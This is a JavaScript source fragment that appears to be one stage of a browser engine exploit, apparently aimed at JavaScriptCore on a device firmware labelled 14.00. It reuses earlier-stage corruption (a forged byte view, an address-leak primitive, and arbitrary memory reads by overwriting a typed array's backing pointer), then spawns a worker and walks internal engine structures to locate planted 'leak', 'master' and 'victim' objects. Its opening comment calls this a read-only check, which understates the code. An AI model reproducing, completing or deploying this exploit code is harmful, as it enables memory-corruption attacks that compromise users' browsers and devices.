// Read-only worker metadata check with a separate ping and explicit 16-byte
// marker buffer, matching the allocation order observed on 14.00 earlier.
return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var settled = false;
  var phase = "preflight";
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    resolve([{ id: "worker_layout_v3", status: status, details: details }]);
  }
  try {
    if (!state || !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !state.calibratedViewBase ||
        state.array[0] !== state.a)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_canary_or_base_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("owned_pointer_slot_outside_view");
    var original = bytesAt(slot);
    function readAt(address, length) {
      length = length || 24;
      if (length < 8 || length > 32)
        throw new Error("read_length_invalid");
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0)
        throw new Error("candidate_address_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < length; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function u32(bytes, at) {
      return (bytes[at] | (bytes[at + 1] << 8) |
              (bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function validPointer(value) {
      return Number.isSafeInteger(value) && value >= 0x100000000 &&
             value < 0x1000000000000 && value % 8 === 0;
    }
    phase = "worker_create";
    if (typeof Worker !== "function" || typeof Blob !== "function")
      throw new Error("worker_unavailable");
    var workerSource = [
      "var marker = new Uint32Array(new ArrayBuffer(0x10));",
      "var roots = [];",
      "self.onmessage = function (event) {",
      "  if (event.data && event.data.name === 'ping') {",
      "    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
      "    return;",
      "  }",
      "  var leak = { value: null };",
      "  var master = new Uint32Array(6);",
      "  var victim = new DataView(new ArrayBuffer(48));",
      "  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "  marker.leak = leak; marker.master = master; marker.victim = victim;",
      "  roots = [marker, leak, master, victim];",
      "  self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);",
      "};"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 6000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
    };
    var pingDone = false;
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        if (!pingDone) {
          if (!event.data || event.data.id !== 0 ||
              event.data.value !== "pong")
            throw new Error("worker_ping_mismatch");
          pingDone = true;
          worker.postMessage({ id: 1, name: "init", args: [] });
          return;
        }
        phase = "transferred_marker";
        var typed = event.data && event.data.type === "ret" &&
          event.data.id === 1 && event.data.value;
        var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
          typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
          typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
        if (!markersOk) throw new Error("transferred_marker_mismatch");
        phase = "buffer_cell";
        var cell = addressOf(typed.buffer);
        if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
        var cellBytes = readAt(cell);
        var impl = ptr(cellBytes, 0x10);
        if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
        phase = "buffer_impl";
        var implBytes = readAt(impl);
        var data = ptr(implBytes, 0x10);
        if (!validPointer(data)) throw new Error("buffer_data_invalid");
        phase = "worker_backing";
        var backing = readAt(data);
        var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
          u32(backing, 4) === 0x1234cafe &&
          u32(backing, 8) === 0x55aa33cc &&
          u32(backing, 12) === 0xcc33aa55;
        if (!backingOk) throw new Error("worker_backing_mismatch");
        phase = "storage_chain";
        var storage = ptr(backing, 0x10);
        if (!validPointer(storage)) throw new Error("storage_pointer_invalid");
        var message = ptr(readAt(storage), 8);
        if (!validPointer(message)) throw new Error("message_pointer_invalid");
        var butterfly = ptr(readAt(message), 8);
        if (!validPointer(butterfly) || butterfly < 0x100000018)
          throw new Error("butterfly_pointer_invalid");
        phase = "worker_references";
        var properties = readAt(butterfly - 24);
        var leak = ptr(properties, 0);
        var victim = ptr(properties, 8);
        var master = ptr(properties, 16);
        if (!validPointer(leak) || !validPointer(victim) ||
            !validPointer(master) || leak === victim ||
            leak === master || victim === master)
          throw new Error("worker_reference_shape_invalid");
        phase = "worker_shapes";
        var masterBytes = readAt(master, 32);
        var victimBytes = readAt(victim, 32);
        var masterLength = u32(masterBytes, 24);
        var victimLength = u32(victimBytes, 24);
        var shapeOk = masterLength === 6 && victimLength === 48 &&
          validPointer(ptr(masterBytes, 16)) &&
          validPointer(ptr(victimBytes, 16));
        var restored = a[0] === 0x31 && a[7] === 0xa8 &&
          integerOf(bytesAt(slot)) === integerOf(original) &&
          state.array[0] === state.a;
        finish(shapeOk && restored ? "pass" : "fail",
               { data: "0x" + data.toString(16),
                 storage: "0x" + storage.toString(16),
                 message: "0x" + message.toString(16),
                 butterfly: "0x" + butterfly.toString(16),
                 master: "0x" + master.toString(16),
                 victim: "0x" + victim.toString(16),
                 leak: "0x" + leak.toString(16),
                 master_len: masterLength, victim_len: victimLength,
                 restored: restored });
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ id: 0, name: "ping", args: [] });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
